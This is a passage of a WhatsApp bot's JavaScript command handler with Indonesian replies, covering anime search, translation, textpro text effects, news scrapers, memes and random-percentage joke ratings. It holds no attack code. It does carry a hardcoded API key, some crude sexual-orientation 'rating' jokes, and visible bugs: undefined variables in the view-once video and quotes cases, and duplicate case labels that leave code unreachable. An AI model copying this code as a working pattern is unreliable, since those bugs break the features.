zyren.sendMessage(m.chat, { audio: { url: data.result.audio_original }, mimetype: "audio/mp4" }, { quoted: m })
} catch {
setReply("Maaf Kak Fitur Sedang Error Silahkan Chat Owner Agar Segera Di Perbaiki") 
}
break
//=================================================//
case "searchgroups":
if (isBan) return //sticBanLu(from)
if (!q) return setReply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = "❰ *WHATSAPP GROUP LINKS* ❱\n\n"
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
setReply(res)
});
break
//=================================================//
case "once": case "toonce": { //by DRIPS
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply("Reply Image") 
if (/image/.test(mime)) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
zyren.sendMessage(m.chat, {image: {url: media},viewOnce : true},{quoted: tzy })
} else if (/video/.test(mime)) {
anu = await zyren.downloadAndSaveMediaMessage(quoted)
zyren.sendMessage(m.chat, {video: {url: media},viewOnce : true},{quoted: tzy })
}
}
break
//=================================================//
case "anime": {
if (isBan) return //sticBanLu(from) 
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!text) return setReply(`you are looking for what anime apa?\n\nEXAMPLE ${prefix}anime naruto`)
anu = await fetchJson(`https://api.jikan.moe/v4/anime?q=${text}`)
let sections = [] 
for (let i of anu.data) {
const list = {title: `${i.title}`,
rows: [
{
 title: `${i.title}`, 
 rowId: `${prefix}animee ${i.mal_id}`,
 description: `${i.synopsis}`
}, 
]
}
sections.push(list) 
}
const sendm =zyren.sendMessage(
 m.chat, 
 {
text: `*Search Results From* ${text}`,
footer: copyright,
title: "*▊▊▊ANIME▊▊▊*",
buttonText: "CLICK HERE",
sections
 }, { quoted : m })
}
break
//=================================================//
case "translate":
try{
let language = [
{"id": "af", "name": "Afrikaans"},
{"id": "sq", "name": "Albanian"},
{"id": "ar", "name": "Arabic"},
{"id": "hy", "name": "Armenian"},
{"id": "ca", "name": "Catalan"},
{"id": "zh", "name": "Chinese"},
{"id": "zh-cn", "name": "Chinese (Mandarin/China)"},
{"id": "zh-tw", "name": "Chinese (Mandarin/Taiwan)"},
{"id": "zh-yue", "name": "Chinese (Cantonese)"},
{"id": "hr", "name": "Croatian"},
{"id": "cs", "name": "Czech"},
{"id": "da", "name": "Danish"},
{"id": "nl", "name": "Dutch"},
{"id": "en", "name": "English"},
{"id": "en-au", "name": "English (Australia)"},
{"id": "en-uk", "name": "English (United Kingdom)"},
{"id": "en-us", "name": "English (United States)"},
{"id": "eo", "name": "Esperanto"},
{"id": "fi", "name": "Finnish"},
{"id": "fr", "name": "French"},
{"id": "de", "name": "German"},
{"id": "el", "name": "Greek"},
{"id": "ht", "name": "Haitian Creole"},
{"id": "hi", "name": "Hindi"},
{"id": "hu", "name": "Hungarian"},
{"id": "is", "name": "Icelandic"},
{"id": "it", "name": "Italian"},
{"id": "ja", "name": "Japanese"},
{"id": "ko", "name": "Korean"},
{"id": "la", "name": "Latin"},
{"id": "lv", "name": "Latvian"},
{"id": "mk", "name": "Macedonian"},
{"id": "no", "name": "Norwegian"},
{"id": "pl", "name": "Polish"},
{"id": "pt", "name": "Portuguese"},
{"id": "pt-br", "name": "Portuguese (Brazil)"},
{"id": "ro", "name": "Romanian"},
{"id": "ru", "name": "Russian"},
{"id": "sr", "name": "Serbian"},
{"id": "sk", "name": "Slovak"},
{"id": "es", "name": "Spanish"},
{"id": "es-es", "name": "Spanish (Spain)"},
{"id": "es-us", "name": "Spanish (United States)"},
{"id": "sw", "name": "Swahili"},
{"id": "sv", "name": "Swedish"},
{"id": "ta", "name": "Tamil"},
{"id": "th", "name": "Thai"},
{"id": "tr", "name": "Turkish"},
{"id": "vi", "name": "Vietnamese"},
{"id": "cy", "name": "Welsh"}
]
let linstId = language.map((x) => x.id)
if (linstId.includes(text.split("|")[0]) && text.split("|")[1]) {
let { data } = await axios.get("https://saipulanuar.ga/api/translate2?text=" + encodeURI(text.split("|")[1]) + "&from=id&to=" + text.split("|")[0]) 
setReply(data.result.hasil) 
} else if (text.split("|")[0] && !linstId.includes(text)) {
let listLanguage = []
for (let x of language) {
listLanguage.push({
title: x.name,
rowId: `${prefix + command} ${x.id}|${text}`,
description: `Language ${x.name}`
})
}
const sections = [
{title: "Total Language" + language.length,
rows: listLanguage }]
const listMessage = {
text: `📂 LANGUAGE`,
buttonText: "Click Here",
sections
}
zyren.sendMessage(m.chat, listMessage, { quoted: m })
} else setReply(`*Example* : ${prefix + command} Selamat pagi`)// Ohayo oni chan >_<
} catch {
setReply("Maaf Kak Fitur Sedang Error Silahkan Chat Owner Agar Segera Di Perbaiki") 
}
break
//=================================================//
case "bully": case "waifu": case "cuddle": case "neko": case "cry": case "kiss": case "hug": case "awoo": case "lick": {
let anu = await getBuffer(`https://yx-api.herokuapp.com/api/sfw/${command}`)
zyren.sendMessage(m.chat, { image: anu, caption: `NihKak` }, { quoted: m})
}
break
//=================================================//
case "kill":case "pat":case "lick":case "bite":case "yeet":case "bonk":case "wink":case "poke":case "nom":case "slap":case "smile":case "wave":case "blush":case "smug":case "glomp":case "happy":case "dance":case "cringe":case "highfive":case "handhold":
if (isBan) return //sticBanLu(from)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
zyren.sendImage(m.chat, data.url, mess.success, m)
})
break
//=================================================//
case "candy": 
case "christmas": 
case "3dchristmas": 
case "sparklechristmas":
case "deepsea": 
case "scifi": 
case "rainbow": 
case "waterpipe": 
case "spooky": 
case "pencil": 
case "circuit": 
case "discovery": 
case "metalic": 
case "fiction": 
case "demon": 
case "transformer": 
case "berry": 
case "thunder": 
case "magma": 
case "3dstone": 
case "neonlight": 
case "glitch": 
case "harrypotter": 
case "brokenglass":
case "papercut": 
case "watercolor":
case "multicolor": 
case "neondevil": 
case "underwater": 
case "graffitibike":
 case "snow": 
 case "cloud": 
 case "honey": 
 case "ice": 
 case "fruitjuice": 
 case "biscuit": 
 case "wood": 
case "chocolate": 
case "strawberry": 
case "matrix": 
case "blood": 
case "dropwater": 
case "toxic": 
case "lava": 
case "rock": 
case "bloodglas": 
case "hallowen": 
case "darkgold": 
case "joker": 
case "wicker":
 case "firework": 
 case "skeleton": 
 case "blackpink": 
 case "sand": 
 case "glue": 
 case "1917": 
 case "leaves": {
  
             if (!q) return setReply(`Contoh : ${prefix + command} ${ownerName}`) 
             onlyWait()
             let link
             if (/candy/.test(command)) link = "https://textpro.me/create-christmas-candy-cane-text-effect-1056.html"
             if (/christmas/.test(command)) link = "https://textpro.me/christmas-tree-text-effect-online-free-1057.html"
             if (/3dchristmas/.test(command)) link = "https://textpro.me/3d-christmas-text-effect-by-name-1055.html"
             if (/sparklechristmas/.test(command)) link = "https://textpro.me/sparkles-merry-christmas-text-effect-1054.html"
             if (/deepsea/.test(command)) link = "https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html"
             if (/scifi/.test(command)) link = "https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html"
             if (/rainbow/.test(command)) link = "https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html"
             if (/waterpipe/.test(command)) link = "https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html"
             if (/spooky/.test(command)) link = "https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html"
             if (/pencil/.test(command)) link = "https://textpro.me/create-a-sketch-text-effect-online-1044.html"
             if (/circuit/.test(command)) link = "https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html"
             if (/discovery/.test(command)) link = "https://textpro.me/create-space-text-effects-online-free-1042.html"
             if (/metalic/.test(command)) link = "https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html"
             if (/fiction/.test(command)) link = "https://textpro.me/create-science-fiction-text-effect-online-free-1038.html"
             if (/demon/.test(command)) link = "https://textpro.me/create-green-horror-style-text-effect-online-1036.html"
             if (/transformer/.test(command)) link = "https://textpro.me/create-a-transformer-text-effect-online-1035.html"
             if (/berry/.test(command)) link = "https://textpro.me/create-berry-text-effect-online-free-1033.html"
             if (/thunder/.test(command)) link = "https://textpro.me/online-thunder-text-effect-generator-1031.html"
             if (/magma/.test(command)) link = "https://textpro.me/create-a-magma-hot-text-effect-online-1030.html"
             if (/3dstone/.test(command)) link = "https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html"
             if (/neonlight/.test(command)) link = "https://textpro.me/create-3d-neon-light-text-effect-online-1028.html"
             if (/glitch/.test(command)) link = "https://textpro.me/create-impressive-glitch-text-effects-online-1027.html"
             if (/harrypotter/.test(command)) link = "https://textpro.me/create-harry-potter-text-effect-online-1025.html"
             if (/brokenglass/.test(command)) link = "https://textpro.me/broken-glass-text-effect-free-online-1023.html"
             if (/papercut/.test(command)) link = "https://textpro.me/create-art-paper-cut-text-effect-online-1022.html"
             if (/watercolor/.test(command)) link = "https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html"
             if (/multicolor/.test(command)) link = "https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html"
             if (/neondevil/.test(command)) link = "https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html"
             if (/underwater/.test(command)) link = "https://textpro.me/3d-underwater-text-effect-generator-online-1013.html"
             if (/graffitibike/.test(command)) link = "https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html"
             if (/snow/.test(command)) link = "https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html"
             if (/cloud/.test(command)) link = "https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html"
             if (/honey/.test(command)) link = "https://textpro.me/honey-text-effect-868.html"
             if (/ice/.test(command)) link = "https://textpro.me/ice-cold-text-effect-862.html"
             if (/fruitjuice/.test(command)) link = "https://textpro.me/fruit-juice-text-effect-861.html"
             if (/biscuit/.test(command)) link = "https://textpro.me/biscuit-text-effect-858.html"
             if (/wood/.test(command)) link = "https://textpro.me/wood-text-effect-856.html"
             if (/chocolate/.test(command)) link = "https://textpro.me/chocolate-cake-text-effect-890.html"
             if (/strawberry/.test(command)) link = "https://textpro.me/strawberry-text-effect-online-889.html"
             if (/matrix/.test(command)) link = "https://textpro.me/matrix-style-text-effect-online-884.html"
             if (/blood/.test(command)) link = "https://textpro.me/horror-blood-text-effect-online-883.html"
             if (/dropwater/.test(command)) link = "https://textpro.me/dropwater-text-effect-872.html"
             if (/toxic/.test(command)) link = "https://textpro.me/toxic-text-effect-online-901.html"
             if (/lava/.test(command)) link = "https://textpro.me/lava-text-effect-online-914.html"
             if (/rock/.test(command)) link = "https://textpro.me/rock-text-effect-online-915.html"
             if (/bloodglas/.test(command)) link = "https://textpro.me/blood-text-on-the-frosted-glass-941.html"
             if (/hallowen/.test(command)) link = "https://textpro.me/halloween-fire-text-effect-940.html"
             if (/darkgold/.test(command)) link = "https://textpro.me/metal-dark-gold-text-effect-online-939.html"
             if (/joker/.test(command)) link = "https://textpro.me/create-logo-joker-online-934.html"
             if (/wicker/.test(command)) link = "https://textpro.me/wicker-text-effect-online-932.html"
             if (/firework/.test(command)) link = "https://textpro.me/firework-sparkle-text-effect-930.html"
             if (/skeleton/.test(command)) link = "https://textpro.me/skeleton-text-effect-online-929.html"
             if (/blackpink/.test(command)) link = "https://textpro.me/create-blackpink-logo-style-online-1001.html"
             if (/sand/.test(command)) link = "https://textpro.me/write-in-sand-summer-beach-free-online-991.html"
             if (/glue/.test(command)) link = "https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html"
             if (/1917/.test(command)) link = "https://textpro.me/1917-style-text-effect-online-980.html"
                if (/leaves/.test(command)) link = "https://textpro.me/natural-leaves-text-effect-931.html"
             let anu = await maker.textpro(link, q)
               zyren.sendMessage(m.chat, { image: { url: anu }, caption: `Nih` }, { quoted: m })
             }
             break
case "transformer": case "fomer": case "trans":
      if(!q) return setReply(`Penggunaan ${command} teks`)
      onlyWait()
      maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
.catch((err) => console.log(err));
break
   

case "herryp": case "potter": case "heryy":
       if(!q) return setReply(`Penggunaan ${command} teks|teks`)
       onlyWait()
       teks1 = q.split("|")[0]
       teks2 = q.split("|")[1]
       maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
 .catch((err) => console.log(err));
 break


case "neondevil": case "neon": case "devil":
      if(!q) return setReply(`Penggunaan ${command} teks`)
      onlyWait()
      maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
         .then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
         .catch((err) => console.log(err));
         
break

case "3dstone": case "stone":
if(!q) return setReply(`Penggunaan ${command} teks`)
onlyWait()
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
    `${q}`,])
  .then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
  .catch((err) => console.log(err));
   
   
break
case "thunder": case "thun":
if(!q) return setReply(`Penggunaan ${command} teks`)
onlyWait()
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
    `${q}`,])
  .then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case "graf":
case "graffiti":
case "grafiti":
if(!q) return setReply(`Penggunaan ${command} teks|teks`)
onlyWait()
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case "glitch3":
if(!q) return setReply(`Penggunaan ${command} teks|teks`)
onlyWait()
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
  .catch((err) => console.log(err));

break

case "3dbox":
if(!q) return setReply(`Penggunaan ${command} teks`)
onlyWait()
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
.catch((err) => console.log(err));

break


case "drapwater": case "water":
if(!q) return setReply(`Penggunaan ${command} teks`)
onlyWait()
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
     `${q}`,])
    .then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
    .catch((err) => console.log(err));

break


case "lion2": case "lionn":
  if(!q) return setReply(`Penggunaan ${command} teks`)
  onlyWait()
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
     .catch((err) => console.log(err));
     
break
case "papercut": case "paper": case "cute":
      if(!q) return setReply(`Penggunaan ${command} teks`)
      onlyWait()
      maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
         .then((data) => zyren.sendMessage(m.chat, { image: { url: data }, caption: `Nih` }, { quoted: m }))
         .catch((err) => console.log(err));
         
break
//=================================================//
case "darkjoke":{
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
zyren.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: m}).catch((err) => setReply("Maaf server Xteam sedang down"))
}
break
//=================================================//
case "meme":{
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
zyren.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: m}).catch((err) => setReply("Maaf server Xteam sedang down"))
}
break
//=================================================//
case "meme2":{
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
zyren.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => setReply("Maaf server Xteam sedang down"))
}
break
//=================================================//
case "fajar-news":
if (isBan) return //sticBanLu(from)
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
setReply(teks) 
})
break
//=================================================//
case "quotes":
if (isBan) return //sticBanLu(from)
var rus = await Quotes()
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${rus.quotes}\n`
teks += ""
setReply(teks)
break
//=================================================//
case "darkjoke": case "darkjokes":
if (isBan) return //sticBanLu(from)
var rus = await Darkjokes()
teks = "*Darkjokes*"
zyren.sendMessage(m.chat, { image : { url : rus }, caption: teks }, { quoted : tzy })
break
//=================================================//
case "cnn-news":
if (isBan) return //sticBanLu(from)
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
setReply(teks) 
})
break
//=================================================//
case "layarkaca-search":
if (isBan) return //sticBanLu(from)
if (!q) return setReply("Judul") 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
setReply(teks) 
})
break
//=================================================//
case "cnbc-news":
if (isBan) return //sticBanLu(from)
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "tribun-news":
if (isBan) return //sticBanLu(from)
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "indozone-news":
if (isBan) return //sticBanLu(from)
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "kompas-news":
if (isBan) return //sticBanLu(from)
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "detik-news":
if (isBan) return //sticBanLu(from)
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "daily-news":
if (isBan) return //sticBanLu(from)
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "inews-news":
if (isBan) return //sticBanLu(from)
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
setReply(teks) 
})
break
//=================================================//
case "okezone-news":
if (isBan) return //sticBanLu(from)
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "sindo-news":
if (isBan) return //sticBanLu(from)
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
setReply(teks) 
})
break
//=================================================//
case "tempo-news":
if (isBan) return //sticBanLu(from)
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "antara-news":
if (isBan) return //sticBanLu(from)
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "kontan-news":
if (isBan) return //sticBanLu(from)
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "merdeka-news":
if (isBan) return //sticBanLu(from)
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zyren.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : tzy })
})
break
//=================================================//
case "jalantikus-meme":
if (isBan) return //sticBanLu(from)
var rus = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${rus}`
teks += ""
zyren.sendMessage(m.chat, { image : { url : rus }, caption: teks }, { quoted : tzy })
break
//=================================================//
/*Random*/
 case "apakah":
 if (isBan) return //sticBanLu(from)
if (!q) return setReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ["Iya", "Tidak", "Bisa Jadi", "Betul"]
const kah = apa[Math.floor(Math.random() * apa.length)]
zyren.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: tzy })
break
//=================================================//
case "bisakah":
if (isBan) return //sticBanLu(from)
if (!q) return setReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ["Bisa","Gak Bisa","Gak Bisa Ajg Aaokawpk","TENTU PASTI KAMU BISA!!!!"]
const ga = bisa[Math.floor(Math.random() * bisa.length)]
zyren.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: tzy })
break
//=================================================//
case "bagaimanakah":
if (isBan) return //sticBanLu(from)
if (!q) return setReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ["Gak Gimana2", "Sulit Itu Bro", "Maaf Bot Tidak Bisa Menjawab", "Coba Deh Cari Di Gugel","astaghfirallah Beneran???","Pusing ah","Owhh Begitu:(","Yang Sabar Ya Bos:(","Gimana yeee"]
const ya = gimana[Math.floor(Math.random() * gimana.length)]
zyren.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: tzy })
break
//=================================================//
case "rate":
if (isBan) return //sticBanLu(from)
if (!q) return setReply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ["5", "10", "15" ,"20", "25","30","35","40","45","50","55","60","65","70","75","80","85","90","100"]
const te = ra[Math.floor(Math.random() * ra.length)]
zyren.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: tzy })
break
//=================================================//
case "gantengcek":
case "cekganteng":
if (isBan) return //sticBanLu(from)
if (!q) return setReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Zyren`)
const gan = ["5", "10", "15" ,"20", "25","30","35","40","45","50","55","60","65","70","75","80","85","90","100"]
const teng = gan[Math.floor(Math.random() * gan.length)]
zyren.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: tzy })
break
//=================================================//
case "cantikcek":
case "cekcantik":
if (isBan) return //sticBanLu(from)
if (!q) return setReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Zyren`)
const can = ["5", "10", "15" ,"20", "25","30","35","40","45","50","55","60","65","70","75","80","85","90","100"]
const tik = can[Math.floor(Math.random() * can.length)]
zyren.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: tzy })
break
//=================================================//
case "sangecek":
case "ceksange":
case "gaycek":
case "cekgay":
case "lesbicek":
case "ceklesbi":
if (isBan) return //sticBanLu(from)
if (!q) return setReply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ["5", "10", "15","20", "25","30","35","40","45","50","55","60","65","70","75","80","85","90","100"]
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
zyren.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: tzy })
break
//=================================================//
case "kapankah":
if (isBan) return //sticBanLu(from)
if (!q) return setReply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ["5 Hari Lagi", "10 Hari Lagi", "15 Hari Lagi","20 Hari Lagi", "25 Hari Lagi","30 Hari Lagi","35 Hari Lagi","40 Hari Lagi","45 Hari Lagi","50 Hari Lagi","55 Hari Lagi","60 Hari Lagi","65 Hari Lagi","70 Hari Lagi","75 Hari Lagi","80 Hari Lagi","85 Hari Lagi","90 Hari Lagi","100 Hari Lagi","5 Bulan Lagi", "10 Bulan Lagi", "15 Bulan Lagi","20 Bulan Lagi", "25 Bulan Lagi","30 Bulan Lagi","35 Bulan Lagi","40 Bulan Lagi","45 Bulan Lagi","50 Bulan Lagi","55 Bulan Lagi","60 Bulan Lagi","65 Bulan Lagi","70 Bulan Lagi","75 Bulan Lagi","80 Bulan Lagi","85 Bulan Lagi","90 Bulan Lagi","100 Bulan Lagi","1 Tahun Lagi","2 Tahun Lagi","3 Tahun Lagi","4 Tahun Lagi","5 Tahun Lagi","Besok","Lusa",`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
zyren.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: tzy })
break
//=================================================//
case "wangy":
if (isBan) return //sticBanLu(from)
if (!q) return setReply (`Contoh : .wangy Zyren`)
qq = q.toUpperCase()
